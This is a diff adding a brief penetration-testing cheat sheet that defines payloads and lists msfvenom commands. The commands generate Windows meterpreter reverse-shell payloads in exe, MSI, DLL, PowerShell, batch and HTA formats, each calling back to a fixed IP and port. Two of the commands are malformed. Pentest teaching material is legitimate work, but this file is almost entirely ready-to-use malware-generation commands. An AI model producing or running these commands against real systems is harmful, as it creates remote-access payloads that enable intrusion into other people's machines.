@@ -1,0 +1,50 @@
+
+A payload in cyber security is a piece of code that is executed after successfully running an exploit to take advantage of a vulnerability. 
+
+Msfvenom is one of the most popular (if not the most popular) payload creators used in pen testing
+
+• -p: payload you want to create
+• lhost: the IP address you want your shell to connect to
+• lport: the port of IP address you want your shell to connect to.
+• -f: Format of the payload
+
+msfvenom -l
+
+# exe payload
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.40.169 lport=4444 -f exe > hc_rs.exe
+
+# MSI payload
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.40.169 lport=4444 -f msi > hc_rs.msi
+
+# DLL payload
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.40.169 lport=4444 -f dll > hc_rs.dll
+
+# PowerShell payload
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.40.169 lport=4444 -f psh > hc_rs.ps1
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.40.169 lport=4444 -f psh-cmd > -f raw
+
+# Batch payloads
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.40.169 lport=4444  > hc_rs.bat
+
+# HTA payload
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.40.169 lport=4444 -f hta-psh > hc_rs.hta
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
